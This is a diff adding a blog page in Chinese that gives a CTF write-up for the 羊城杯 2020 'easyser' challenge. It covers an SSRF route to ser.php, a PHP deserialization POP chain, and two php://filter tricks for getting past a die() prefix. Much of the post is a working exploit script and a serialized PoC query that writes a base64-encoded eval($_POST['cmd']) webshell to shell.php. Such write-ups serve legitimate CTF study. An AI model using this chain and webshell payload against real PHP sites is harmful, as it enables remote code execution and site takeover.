@@ -1,0 +1,307 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8" >
+
+<title>[羊城杯 2020]easyser | he11的农场</title>
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
+<link rel="shortcut icon" href="https://dydydy123.github.io/favicon.ico?v=1668758531936">
+<link rel="stylesheet" href="https://dydydy123.github.io/styles/main.css">
+
+
+
+<link rel="stylesheet" href="https://unpkg.com/aos@next/dist/aos.css" />
+<script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
+
+
+
+    <meta name="description" content="
+访问首页没有任何东西
+
+
+查看robots.txt，获得路径/star1.php
+
+
+访问/star1.php，查看网页源码获得hint，从不安全的协议(HTTP)，我家(127.0.0.1)推测需通过ssrf访问ser.php
+
+
+源码..." />
+    <meta name="keywords" content="php反序列化,死亡exit" />
+  </head>
+  <body>
+    <div id="app" class="main">
+
+      <div class="sidebar" :class="{ 'full-height': menuVisible }">
+  <div class="top-container" data-aos="fade-right">
+    <div class="top-header-container">
+      <a class="site-title-container" href="https://dydydy123.github.io">
+        <img src="https://dydydy123.github.io/images/avatar.png?v=1668758531936" class="site-logo">
+        <h1 class="site-title">he11的农场</h1>
+      </a>
+      <div class="menu-btn" @click="menuVisible = !menuVisible">
+        <div class="line"></div>
+      </div>
+    </div>
+    <div>
+      
+        
+          <a href="/" class="site-nav">
+            首页
+          </a>
+        
+      
+        
+          <a href="/archives" class="site-nav">
+            归档
+          </a>
+        
+      
+        
+          <a href="/tags" class="site-nav">
+            标签
+          </a>
+        
+      
+        
+          <a href="/post/about" class="site-nav">
+            关于
+          </a>
+        
+      
+    </div>
+  </div>
+  <div class="bottom-container" data-aos="flip-up" data-aos-offset="0">
+    <div class="social-container">
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    </div>
+    <div class="site-description">
+      ganma~~~~~~~~~~
+    </div>
+    <div class="site-footer">
+       | <a class="rss" href="https://dydydy123.github.io/atom.xml" target="_blank">RSS</a>
+    </div>
+  </div>
+</div>
+
+
+      <div class="main-container">
+        <div class="content-container" data-aos="fade-up">
+          <div class="post-detail">
+            <h2 class="post-title">[羊城杯 2020]easyser</h2>
+            <div class="post-date">2022-10-19</div>
+            
+              <div class="feature-container" style="background-image: url('https://dydydy123.github.io/post-images/yang-cheng-bei-2020easyser.jpg')">
+              </div>
+            
+            <div class="post-content" v-pre>
+              <!-- more -->
+<p>访问首页没有任何东西<br>
+<img src="https://dydydy123.github.io/post-images/1666179106493.png" alt="" loading="lazy"></p>
+<!-- more -->
+<p>查看robots.txt，获得路径/star1.php<br>
+<img src="https://dydydy123.github.io/post-images/1666179186532.png" alt="" loading="lazy"></p>
+<!-- more -->
+<p>访问/star1.php，查看网页源码获得hint，从不安全的协议(HTTP)，我家(127.0.0.1)推测需通过ssrf访问ser.php<br>
+<img src="https://dydydy123.github.io/post-images/1666179236763.png" alt="" loading="lazy"></p>
+<!-- more -->
+<p>源码分析：</p>
+<pre><code>&lt;?php
+error_reporting(0);
+if ( $_SERVER['REMOTE_ADDR'] == &quot;127.0.0.1&quot; ) {
+    highlight_file(__FILE__);
+} 
+$flag='{Trump_:&quot;fake_news!&quot;}';
+class GWHT{
+    public $hero;
+    public function __construct(){
+        $this-&gt;hero = new Yasuo;
+    }
+    public function __toString(){
+        if (isset($this-&gt;hero)){
+            return $this-&gt;hero-&gt;hasaki();
+        }else{
+            return &quot;You don't look very happy&quot;;
+        }
+    }
+}
+class Yongen{ //flag.php
+    public $file;
+    public $text;
+    public function __construct($file='',$text='') {
+        $this -&gt; file = $file;
+        $this -&gt; text = $text;
+    }
+    public function hasaki(){
+        $d   = '&lt;?php die(&quot;nononon&quot;);?&gt;';
+        $a= $d. $this-&gt;text;
+         @file_put_contents($this-&gt; file,$a);
+    }
+}
+class Yasuo{
+    public function hasaki(){
+        return &quot;I'm the best happy windy man&quot;;
+    }
+} 
+</code></pre>
+<p>从源码可看出考点为php反序列化加死亡绕过。但是并未发现反序列上传利用的点。使用arjun扫描可能存在的注入点。</p>
+<!-- more -->
+<figure data-type="image" tabindex="1"><img src="https://dydydy123.github.io/post-images/1666180401237.png" alt="" loading="lazy"></figure>
+<!-- more -->
+<p>发现还存在一个注入点c，尝试输入一下反序列化</p>
+<pre><code>附上师傅们发的c参数逻辑
+$c=$_GET['c']; 
+    if(isset($c)){
+        echo $x = unserialize($c);  //echo 的时候会触发 __toString() 魔术方法
+    }
+    else{
+        echo &quot;your hat is too black!&quot;;
+    }
+
+</code></pre>
+<!-- more -->
+<p>目的通过file_put_contents(<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>t</mi><mi>h</mi><mi>i</mi><mi>s</mi><mo>−</mo><mo>&gt;</mo><mi>f</mi><mi>i</mi><mi>l</mi><mi>e</mi><mo separator="true">,</mo></mrow><annotation encoding="application/x-tex">this-&gt; file,</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.77777em;vertical-align:-0.08333em;"></span><span class="mord mathdefault">t</span><span class="mord mathdefault">h</span><span class="mord mathdefault">i</span><span class="mord mathdefault">s</span><span class="mord">−</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&gt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mord mathdefault">i</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">e</span><span class="mpunct">,</span></span></span></span>a);写入🐎</p>
+<!-- more -->
+<p>pop链：<br>
+GWHT的__toString()-&gt;Yongen的hasaki()<br>
+从源码中并未发现__toString()的利用点，但pop链必须用到该方法，猜测后端存在利用点。</p>
+<!-- more -->
+<p>死亡绕过方法：</p>
+<!-- more -->
+<p>使用php://filter协议有两种途径可绕过。</p>
+<!-- more -->
+<p>1.使用string.strip_tags字符串过滤器：去除html、PHP语言标签。</p>
+<!-- more -->
+<p>我们的目的是写入一个webshell，而写入的webshell也有PHP语言标签，如果使用strip_tags同样会被去除。php://filter允许使用多个过滤器，于是我们添加 convert.base64-decode  将webshell  base64编码输入，convert.base64-decode会将我们的输入解码写如文件，而&lt;?php die(&quot;nononon&quot;);?被string.strip_tags处理失效。</p>
+<!-- more -->
+<pre><code>$test-&gt;hero-&gt;file='php://filter/write=string.strip_tags|convert.base64-decode/resource=shell.php';
+//&lt;?php @eval($_POST['cmd']);?&gt;
+$test-&gt;hero-&gt;text='PD9waHAgQGV2YWwoJF9QT1NUWydjbWQnXSk7Pz4=';
+</code></pre>
+<!-- more -->
+<p>2.使用convert.base64-decode过滤器将<?php die("nononon");?>解码输入。base64编码中只包含64个可打印字符，而PHP在解码base64时，遇到不在其中的字符时，将会跳过这些字符，仅将合法字符组成一个新的字符串进行解码。<?php die("nononon");?>中可识别字符串为phpdienononon(11个字符)base64解码时每4byte一组进行，需补3字符,此处补了aaa。</p>
+<!-- more -->
+<pre><code>$test-&gt;hero-&gt;file='php://filter/write=convert.base64-decode/resource=shell.php';
+$test-&gt;hero-&gt;text='aaaPD9waHAgQGV2YWwoJF9QT1NUWydjbWQnXSk7Pz4=';
+</code></pre>
+<!-- more -->
+<p>exp：</p>
+<!-- more -->
+<pre><code>&lt;?php
+
+class GWHT{
+    public $hero;
+}
+class Yongen{ //flag.php
+    public $file;
+    public $text;
+    public function __construct($file='',$text='') {
+        $this -&gt; file = $file;
+        $this -&gt; text = $text;
+
+    }
+    public function hasaki(){
+        $d   = '&lt;?php die(&quot;nononon&quot;);?&gt;';
+        $a= $d. $this-&gt;text;
+        @file_put_contents($this-&gt; file,$a);
+    }
+}
+class Yasuo{
+    public function hasaki(){
+        return &quot;I'm the best happy windy man&quot;;
+    }
+}
+
+$test = new GWHT();
+$test-&gt;hero = new Yongen();
+//string.strip_tags过滤器:过滤html，和php标签
+//$test-&gt;hero-&gt;file='php://filter/write=string.strip_tags|convert.base64-decode/resource=shell.php';
+//$test-&gt;hero-&gt;text='PD9waHAgQGV2YWwoJF9QT1NUWydjbWQnXSk7Pz4=';
+
+//convert.base64-decode过滤器:将输入b64解密后传文件    '&lt;?php die(&quot;nononon&quot;);?';  被b64解密后只省下[a-z0-9A-Z+]  及phpdienonon  11个字符，
+//b64解密  4个byte（字节）一组 所以需要添加3个aaa
+
+//b64解密相对于如下代码
+//$_GET['txt'] = preg_replace('|[^a-z0-9A-Z+/]|s', '', $_GET['txt']);
+//base64_decode($_GET['txt']);
+$test-&gt;hero-&gt;file='php://filter/write=convert.base64-decode/resource=shell.php';
+$test-&gt;hero-&gt;text='aaaPD9waHAgQGV2YWwoJF9QT1NUWydjbWQnXSk7Pz4=';
+var_dump(serialize($test));
+</code></pre>
+<!-- more -->
+<p>poc:</p>
+<pre><code>path=http://127.0.0.1/ser.php&amp;c=O:4:&quot;GWHT&quot;:1:{s:4:&quot;hero&quot;;O:6:&quot;Yongen&quot;:2:{s:4:&quot;file&quot;;s:59:&quot;php://filter/write=convert.base64-decode/resource=shell.php&quot;;s:4:&quot;text&quot;;s:43:&quot;aaaPD9waHAgQGV2YWwoJF9QT1NUWydjbWQnXSk7Pz4=&quot;;}}
+</code></pre>
+<figure data-type="image" tabindex="2"><img src="https://dydydy123.github.io/post-images/1666181871640.png" alt="" loading="lazy"></figure>
+
+            </div>
+            
+              <div class="tag-container">
+                
+                  <a href="https://dydydy123.github.io/tag/4U_Qdkddw/" class="tag">
+                    php反序列化
+                  </a>
+                
+                  <a href="https://dydydy123.github.io/tag/ToNq-gjvm/" class="tag">
+                    死亡exit
+                  </a>
+                
+              </div>
+            
+            
+              <div class="next-post">
+                <div class="next">下一篇</div>
+                <a href="https://dydydy123.github.io/post/hello-gridea/">
+                  <h3 class="post-title">
+                    Hello Gridea
+                  </h3>
+                </a>
+              </div>
+            
+
+            
+
+          </div>
+
+        </div>
+      </div>
+    </div>
+
+    <script src="https://unpkg.com/aos@next/dist/aos.js"></script>
+<script type="application/javascript">
+
+AOS.init();
+
+var app = new Vue({
+  el: '#app',
+  data: {
+    menuVisible: false,
+  },
+})
+
+</script>
+
+
+  <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  <script>
+    hljs.initHighlightingOnLoad()
+  </script>
+
+
+
+
+
+  </body>
+</html>
